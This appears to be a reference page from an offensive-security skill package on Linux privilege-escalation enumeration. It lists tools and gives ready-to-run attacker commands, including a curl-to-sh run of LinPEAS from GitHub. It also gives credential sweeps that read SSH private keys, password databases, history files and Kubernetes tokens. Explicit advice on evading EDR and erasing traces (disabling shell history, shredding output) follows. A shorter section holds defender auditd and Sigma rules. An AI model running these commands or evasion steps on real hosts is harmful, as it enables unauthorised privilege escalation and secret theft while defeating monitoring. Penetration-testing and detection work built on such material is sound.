# Enumeration & Tooling

Privilege escalation is 80% enumeration. The goal is to convert an unprivileged shell into a ranked
list of escalation primitives (SUID, sudo, caps, writable units, kernel CVEs, container surface)
with **evidence** for a finding record — while minimizing telemetry on monitored hosts.

## Theory / mechanism

A Linux LPE primitive is any path where attacker-controlled input crosses a privilege boundary:

- A binary that runs as a higher UID/GID (SUID/SGID, `sudo`, file capabilities).
- A scheduled or daemon task that executes an attacker-writable file (`cron`, `systemd`, `.service`).
- A trusted lookup that resolves to attacker-controlled data (`$PATH`, `LD_PRELOAD`, NSS, library search path).
- A kernel/userland-service code path reachable from an unprivileged context (syscalls, D-Bus, polkit).

Enumeration finds those crossings. Order of operations matters: cheap, low-noise, high-yield checks
first (`id`, `sudo -l`, SUID list, caps), then heavier sweeps (full FS walks, process timing) only
if needed and the host is not aggressively monitored.

## Tooling landscape (2024-2026)

| Tool | What it does | Get it | Notes |
|------|--------------|--------|-------|
| **LinPEAS** (PEASS-ng) | All-in-one enum, colour-ranked "95% special" findings | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` | Very noisy; actively detected by EDR. Use `-q` and section flags. |
| **pspy** | Watches processes/cron without root via procfs polling | `https://github.com/DominicBreuker/pspy/releases` (`pspy64`) | Finds root cron jobs + their args (wildcards!) without writing to disk. |
| **linux-exploit-suggester 2** (LES2) | Maps `uname -r` to kernel CVEs | `https://github.com/jondonas/linux-exploit-suggester-2` | Perl; pairs with `--kernelspace-only`. Older `mzet-/les` also maintained. |
| **unix-privesc-check** | Classic config audit (Kali built-in) | `unix-privesc-check standard` | Good cross-check for writable configs. |
| **GTFOBins** | Lookup table: binary → SUID/sudo/cap escape | `https://gtfobins.github.io` | The canonical reference for SUID/sudo/caps escapes. |
| **BeRoot / deepce** | Misc privesc / docker-aware enum | github | `deepce.sh` is container-focused. |
| `linpriv_enum.py` (this skill) | Dependency-free, detection-aware, JSON evidence | `scripts/linpriv_enum.py` | Pure stdlib python3; `--quick`/`--full`/`--json`. |

### Run LinPEAS quietly and pipe to a log

```bash
# Stream from attacker host without touching disk on target (fileless)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh -s -- -q 2>/dev/null | tee /dev/shm/.lp
# -q  = quiet (no banner/animations, far less noise)
# Limit to specific checks to cut the find-storm:
#   sh linpeas.sh -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks,Net,UsrI,SofI,IntFiles
```

### pspy — catch root cron + wildcard args without root

```bash
# Upload pspy64, run, wait one cron cycle (>=60s)
chmod +x pspy64 && ./pspy64 -pf -i 1000
# -p  watch processes  -f  watch file events  -i  poll interval (ms)
# Watch for: root-owned cron running scripts you can write, or tar/rsync/zip with '*'
```

### linux-exploit-suggester-2

```bash
perl linux-exploit-suggester-2.pl -k $(uname -r)   # or run with no args on target
# Prefer this skill's kernel_exploit_suggester.py for current (2024-2026) CVE coverage.
```

## The `linpriv_enum.py` methodology

`scripts/linpriv_enum.py` is a self-contained enumerator (Python 3 stdlib only, runs on minimal
hosts). It implements the ordered checklist below and emits structured JSON evidence suitable for a
finding record. Two modes:

- `--quick` (default) — only the high-yield, low-noise checks (no full FS walk). ~1-2s, minimal IO.
- `--full` — adds whole-filesystem SUID/SGID/cap/world-writable sweeps (noisy; EDR-visible).

```bash
python3 scripts/linpriv_enum.py --quick
python3 scripts/linpriv_enum.py --full --json /dev/shm/.pe.json
python3 scripts/linpriv_enum.py --section sudo,suid,caps,kernel   # targeted
```

### Quick-win checklist (in priority order)

```bash
id; sudo -n -l 2>/dev/null            # 1. sudo rights (NOPASSWD = instant win)
getcap -r / 2>/dev/null               # 2. file capabilities (cap_setuid+ep)
find / -perm -4000 -type f 2>/dev/null   # 3. SUID set -> cross-ref GTFOBins
sudo --version | head -1              # 4. sudo CVE-2025-32462/-32463 range check
ls -l /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null   # 5. writable critical files
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.*/ 2>/dev/null   # 6. cron
systemctl list-timers --all 2>/dev/null; find /etc/systemd -writable 2>/dev/null  # 7. timers/units
echo "$PATH" | tr ':' '\n'            # 8. writable/relative PATH entries
uname -r; (ldd --version 2>&1 | head -1)   # 9. kernel + glibc CVE surface
cat /proc/1/cgroup 2>/dev/null; ls -la /.dockerenv 2>/dev/null  # 10. containerized?
ps -eo user,pid,cmd --sort=user 2>/dev/null   # 11. processes by other users
```

### System / context baseline

```bash
uname -a; cat /etc/os-release; arch; cat /proc/version
id; groups; cat /etc/passwd | cut -d: -f1,3,7    # users + shells
last -a 2>/dev/null; w; who                       # who else is here (avoid them)
env; cat ~/.bash_history ~/.*_history 2>/dev/null # creds in env/history
ip -br a; ss -tulpn 2>/dev/null                   # internal-only services to pivot
mount; cat /etc/fstab; df -h                      # nfs/no_root_squash, loop mounts
```

### Credential & secret sweep (often the fastest win)

```bash
grep -RInaE 'password|passwd|secret|api[_-]?key|token|BEGIN (RSA|OPENSSH|EC) PRIVATE' \
  /etc /opt /srv /var/www /home 2>/dev/null | grep -vE '\.(png|jpg|gz|so)$' | head -50
find / -name '*.kdbx' -o -name 'id_rsa' -o -name '.git-credentials' 2>/dev/null
find / -name 'authorized_keys' 2>/dev/null; cat /home/*/.ssh/id_* 2>/dev/null
# Cloud / orchestration tokens:
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
find / -name '*.env' -o -name 'credentials' -path '*aws*' 2>/dev/null
```

## Detection-aware (low-noise) enumeration

Modern EDR (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint on Linux, Elastic,
Falco) and auditd flag mass enumeration. To stay quiet:

- **Avoid `find / -perm -4000`** on every host — it triggers file-scan anomaly heuristics and a huge
  `openat` burst. Instead read the SUID list from a cached/known location or restrict to `$PATH`:
  `for d in $(echo $PATH | tr ':' ' '); do find "$d" -perm -4000 2>/dev/null; done`.
- **Don't drop LinPEAS to disk** under a named file — stream it (`curl | sh`) or stage in `/dev/shm`
  with a dotted name; many AVs have signatures for `linpeas.sh` on disk.
- **Throttle** — `linpriv_enum.py --quick` runs the targeted checks and skips FS walks.
- **Reuse existing binaries** — `getcap`, `sudo -l`, reading `/etc/crontab` are normal admin actions
  and rarely alert; chaining `which`/`ls`/`cat` is far quieter than a privesc script.
- **No compilers if avoidable** — `gcc`/`cc` execve from a web/app service account is a strong signal.
  Prefer interpreted GTFOBins escapes or precompiled exploits dropped to `/dev/shm`.

## Detection

What enumeration looks like to the defender, and how to catch it.

**auditd rules to detect mass SUID enumeration / privesc tooling:**

```
# /etc/audit/rules.d/privesc-enum.rules
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/find -F a1=-perm -k suid_enum
-w /etc/sudoers -p wa -k sudoers_change
-w /etc/sudoers.d/ -p wa -k sudoers_change
-w /etc/cron.d/ -p wa -k cron_change
-w /etc/systemd/system/ -p wa -k unit_change
-a always,exit -F arch=b64 -S setuid -F a0=0 -F auid>=1000 -F auid!=unset -k uid0_setuid
```

**Sigma — privesc enumeration tooling execution (process_creation, linux):**

```yaml
title: Linux Privilege Escalation Enumeration Tool Execution
id: 7c2a9a01-3f4d-4b2e-9c5a-privesc-enum
logsource:
  product: linux
  category: process_creation
detection:
  selection_names:
    Image|endswith:
      - '/linpeas.sh'
      - '/les.sh'
      - '/linux-exploit-suggester.sh'
      - '/pspy64'
      - '/unix-privesc-check'
  selection_find:
    Image|endswith: '/find'
    CommandLine|contains:
      - '-perm -4000'
      - '-perm -2000'
      - '-perm -u=s'
  condition: selection_names or selection_find
level: medium
```

**EDR telemetry / IOCs:**
- High-volume `openat`/`stat` over the whole tree in seconds (file-scan anomaly).
- Web/app/service accounts (`www-data`, `nginx`, `tomcat`) running `find`, `getcap`, `sudo -l`, `gcc`.
- Scripts named `linpeas*`, `les*`, `pspy*` on disk or in `/tmp`, `/dev/shm`, `/var/tmp`.
- Reads of `/etc/shadow`, `id_rsa`, `*.kdbx`, k8s SA token by non-admin processes.

## OPSEC

- **Touches:** process table, `auditd execve` records, `bash_history` (use `set +o history` /
  `unset HISTFILE` / run interpreter with history disabled), file `atime` (often `relatime` so
  minimal), and EDR file-scan heuristics if you do a full FS walk.
- **Cleanup:** remove any uploaded enum tools and JSON output (`shred -u /dev/shm/.pe.json`); clear
  the relevant `HISTFILE` lines; don't leave `linpeas.sh` on disk.
- **Evasion:** prefer `/dev/shm` (tmpfs, often no exec-blocking, not persisted), dotted filenames,
  fileless `curl | sh`, and targeted checks over the full LinPEAS run on monitored hosts.

## References

- Carlos Polop, **PEASS-ng / LinPEAS** — https://github.com/carlospolop/PEASS-ng
- **pspy** (Dominic Breuker) — https://github.com/DominicBreuker/pspy
- **linux-exploit-suggester-2** — https://github.com/jondonas/linux-exploit-suggester-2
- **GTFOBins** — https://gtfobins.github.io
- HackTricks, *Linux Privilege Escalation* — https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- Elastic Security, prebuilt Linux privesc detection rules — https://www.elastic.co/guide/en/security/current/prebuilt-rules.html
